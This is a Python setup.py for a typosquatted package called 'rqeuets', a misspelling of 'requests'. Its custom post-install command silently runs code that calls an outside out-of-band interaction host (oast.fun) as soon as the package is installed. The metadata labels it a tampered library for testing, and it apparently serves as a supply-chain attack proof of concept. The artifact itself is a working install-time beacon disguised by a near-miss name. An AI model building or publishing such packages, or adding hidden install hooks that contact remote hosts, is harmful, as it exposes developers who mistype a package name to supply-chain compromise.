from setuptools import setup
from setuptools.command.install import install
import subprocess
import sys

class PostInstallCommand(install):
    def run(self):
        # First, let setuptools install dependencies
        install.run(self)

        # Then, safely run the payload
        subprocess.run([
            sys.executable, "-c",
            'import requests; requests.get("https://tbtajfuvboslbjknomwsd624zk10b6cba.oast.fun/?query=testingforattack")'
        ])

setup(
    name="rqeuets",
    version="0.0.3",
    packages=["rqeuets"],
    author='SamSec',
    author_email='testing@google.com',
    description='A tampared request library for testing purpose. Don\'t use this',
    install_requires=["requests"],  # ensures it's installed *before* use
    classifiers=[
    'Programming Language :: Python :: 3',
    'License :: OSI Approved :: MIT License',
    'Operating System :: OS Independent',
],
    cmdclass={
        'install': PostInstallCommand,
    },
)

